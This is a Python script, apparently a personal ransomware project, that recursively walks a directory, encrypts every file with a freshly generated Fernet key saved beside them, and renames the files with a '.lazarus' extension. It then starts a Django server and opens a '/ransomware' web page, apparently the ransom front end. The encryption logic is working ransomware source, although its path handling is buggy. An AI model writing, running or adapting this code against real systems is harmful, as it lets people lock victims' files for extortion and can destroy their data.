from cryptography.fernet import Fernet

import os


# from django.core.management import execute_from_command_line
def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry.name
        else:
            if entry.is_dir():
                yield from scanRecurse(entry.path)


    # key generation
key = Fernet.generate_key()

# string the key in a file
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)

# opening the key
with open('filekey.key', 'rb') as filekey:
	key = filekey.read()
    
# using the generated key
fernet = Fernet(key)

for filename in scanRecurse("/home/sharan-rao/PythonProjects/ransomware/testdir"):
    if filename not in ("filekey.key","ransomware.py"):
        
        with open(filename, 'rb') as file:
            original = file.read()
        
        
        # encrypting the file
        encrypted = fernet.encrypt(original)

        # opening the file in write mode and
        # writing the encrypted data
        with open(filename, 'wb') as encrypted_file:
            x=filename.split('.')
            encrypted_filename = x[0] + '.lazarus'
            # print(file)
            encrypted_file.write(encrypted)
            os.rename(filename,encrypted_filename)

# if __name__ == "__main__":
#     execute_from_command_line(["manage.py", "runserver"])

import os

if __name__ == "__main__":
    os.system("python manage.py runserver")

import subprocess
import webbrowser

if __name__ == "__main__":
    # Start the Django development server in the background
    server_process = subprocess.Popen(["python", "/home/sharan-rao/PythonProjects/ransomware/ransomwareproject/manage.py", "runserver"])

    # Define the URL you want to open in the browser
    url = "http://127.0.0.1:8000/ransomware"  # Change this to your desired URL

    # Open the default web browser with the specified URL
    webbrowser.open(url)

    # Wait for the server process to finish
    server_process.wait()






    



